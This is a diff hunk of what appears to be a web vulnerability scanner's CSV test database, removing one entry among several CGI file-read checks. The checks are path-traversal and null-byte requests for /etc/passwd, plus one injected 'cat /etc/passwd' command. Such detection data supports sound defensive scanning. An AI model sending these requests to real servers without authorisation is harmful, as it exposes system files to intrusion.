@@ -657,7 +657,6 @@
 "000633","235","5","@CGIDIRSwebdist.cgi?distloc=;cat%20/etc/passwd","GET","root:","","","","","This CGI allows attackers to read files remotely.","",""
 "000634","506","5","@CGIDIRSway-board/way-board.cgi?db=/etc/passwd%00","GET","root:","","","","","Allows attackers to read arbitrary files from the server.","",""
 "000635","506","5","@CGIDIRSway-board.cgi?db=/etc/passwd%00","GET","root:","","","","","Allows attackers to read arbitrary files from the server.","",""
-"000636","0","5","@CGIDIRSview_item?HTML_FILE=../../../../../../../../../../etc/passwd%00","GET","root:","","","","","This CGI allows reading of remote files.","",""
 "000637","0","5","@CGIDIRSviewsource?/etc/passwd","GET","root:","","","","","Allows attacker to retrieve arbitrary files.  Remove from CGI directory.","",""
 "000638","0","5","@CGIDIRSttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd","GET","root:","","","","","Tarantell TTAWeb Top CGI lets remote users read arbitrary files.","",""
 "000639","0","5","@CGIDIRStraffic.cgi?cfg=../../../../../../../../etc/passwd","GET","root:","","","","","Multi Router Traffic Grapher (mrtg.org) is vulnerable to a 'show files' vulnerability. Software should be upgraded to the latest version.","",""
